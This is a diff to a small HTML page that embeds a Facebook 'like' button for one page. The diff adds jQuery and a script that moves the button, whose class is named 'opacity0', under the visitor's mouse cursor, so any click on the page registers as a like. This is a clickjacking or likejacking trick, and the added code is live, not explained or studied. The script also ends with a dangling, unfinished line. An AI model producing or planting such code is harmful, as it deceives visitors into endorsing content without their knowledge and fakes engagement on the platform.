@@ -1,6 +1,11 @@
 <html>
 <head>
-
+<style>
+.opacity0
+{
+position: absolute;
+}
+</style>
 </head>
 
 <body>
@@ -14,6 +19,21 @@
 }(document, 'script', 'facebook-jssdk'));</script>
 
 <div class="fb-like opacity0" data-href="https://www.facebook.com/8v.corner/" data-layout="button" data-action="like" data-size="small" data-show-faces="false" data-share="false"></div>
-</body>
 
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script>
+$(document).mousemove(function(event){
+var likebtn = $('.opacity0');
+
+likebtn.css('left', event.pageX + "px");
+likebtn.css('top', event.pageY + "px");
+
+});
+
+$('.opacity0')
+
+
+</script>
+
+</body>
 </html>
